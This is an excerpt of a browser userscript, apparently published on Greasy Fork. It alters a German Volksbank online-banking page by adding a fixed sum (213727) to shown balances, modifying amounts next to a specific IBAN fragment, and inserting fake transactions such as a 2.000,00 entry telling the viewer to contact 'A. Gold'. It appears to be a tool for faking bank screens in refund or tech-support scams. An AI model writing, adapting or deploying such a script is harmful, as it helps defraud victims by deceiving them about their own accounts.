// ==UserScript==
// @name         Ed 4Rec  post.SilviaKiefer@t-online.de
...
// @run-at       document-end
// @downloadURL https://update.greasyfork.org/scripts/533728/Ed%204Rec%20%20postSilviaKiefer%40t-onlinede.user.js
// @updateURL https://update.greasyfork.org/scripts/533728/Ed%204Rec%20%20postSilviaKiefer%40t-onlinede.meta.js
// ==/UserScript==
...
//11111111111---------------VOLKS FINUB BAL CHANGE----------------------------------------------------------------------------------------------------------------------------
   ...
   // Array of configurable balance adjustments
    var BALANCE_CONFIGS = [
        { index: 0, adjustmentAmount:  213727},
        { index: 1, adjustmentAmount:  213727},
        { index: 2, adjustmentAmount:  213727},
...
//222222444444---------------VOLKS UMSAETZE AND UEBER BAL CHANGE---------------------------------------------------------------------------------------------------------------
    ...
    // Define the target text content to search for (case and whitespace insensitive)
       var targetTextContent1 = "DE23 4606 2817";
       var targetTextContent2 = " 0161 3618 00";

    // Configurable modification amount (positive or negative)
    const modificationAmount = 213727; // Adjust the amount as needed
...
//33333333333---------------VOLKS UMSAETZE MULTIPLE TRANSACTIONS--------------------------------------------------------------------------------------------------------------
        ...
        },
 {
            ...
            description: 'A. Gold kontaktieren. ',
            amount: '2.000,00',
            date: 'Gestern',
            insertAfter: false, // Set to false to insert before the original transaction
           moveSteps: 1, // Number of steps to move the transaction
